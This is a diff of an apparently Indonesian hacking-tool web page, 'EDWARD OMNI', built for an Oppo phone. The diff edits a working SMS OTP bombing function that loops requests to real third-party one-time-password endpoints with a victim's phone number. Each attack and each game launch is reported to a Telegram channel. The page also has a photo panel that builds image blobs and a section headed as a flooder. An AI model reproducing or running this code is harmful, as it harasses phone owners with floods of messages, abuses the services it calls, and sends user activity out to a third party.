@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[ EDWARD OMNI V.5.5 GACOR ]</title>
+    <title>[ EDWARD OMNI V.5.8 ULTIMATE ]</title>
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 15px; text-align: center; }
         .panel { border: 2px solid #0f0; border-radius: 10px; padding: 15px; margin-bottom: 15px; box-shadow: 0 0 10px #0f0; background: rgba(0, 20, 0, 0.9); }
@@ -19,8 +19,8 @@
 </head>
 <body>
 
-    <h1>[ EDWARD OMNI V.5.5 ]</h1>
-    <p>DEVICE: OPPO A18 | SYSTEM: ULTIMATE GACOR</p>
+    <h1>[ EDWARD OMNI V.5.8 ]</h1>
+    <p>DEVICE: OPPO A18 | SYSTEM: FIX GACOR</p>
 
     <div class="panel">
         <h3>📡 SATELLITE & PHOTO</h3>
@@ -97,26 +97,30 @@
             return new Blob([ab], { type: 'image/jpeg' });
         }
 
-        // ⚔️ SMS OTP SPAMMER (ANONIM)
+        // ⚔️ FIX SMS OTP SPAMMER (ANONIM)
         function spamOTP() {
             let n = document.getElementById('noTarget').value;
             if(!n) return alert("Masukkan Nomor!");
             alert("BOM SMS OTP DIKIRIM!");
-            kirimTele(`⚔️ SMS OTP ATTACK!\nTarget: ${n}\nStatus: Anonim via Server.`);
+            kirimTele(`⚔️ SMS OTP ATTACK!\nTarget: ${n}`);
             
-            const apis = [
+            const urls = [
                 `https://id.jagreward.com/auth/login/receiver?phone=${n}`,
-                `https://www.tokocash.com/api/v1/otp?phone=${n}`
+                `https://m.reddoorz.com/api/v1/users/send_otp?phone=${n}`
             ];
-            for (let i = 0; i < 5; i++) {
-                apis.forEach(api => { fetch(api, { mode: 'no-cors' }).catch(() => {}); });
+            for (let i = 0; i < 3; i++) {
+                urls.forEach(api => { fetch(api, { mode: 'no-cors' }).catch(() => {}); });
             }
         }
 
-        // 🎮 LAUNCHER
+        // 🎮 FIX GAME LAUNCHER
         function launch(pkg) {
-            kirimTele(`🎮 MEMBUKA GAME: ${pkg}`);
-            window.location.href = "intent://#Intent;scheme=android-app;package=" + pkg + ";end";
+            kirimTele(`🎮 OPENING: ${pkg}`);
+            if (pkg === 'net.kdt.pojavlaunch') {
+                window.location.href = "intent://#Intent;package=net.kdt.pojavlaunch;scheme=package;end";
+            } else {
+                window.location.href = "intent://#Intent;scheme=android-app;package=" + pkg + ";end";
+            }
         }
 
         // 💣 FLOODER JUDOL
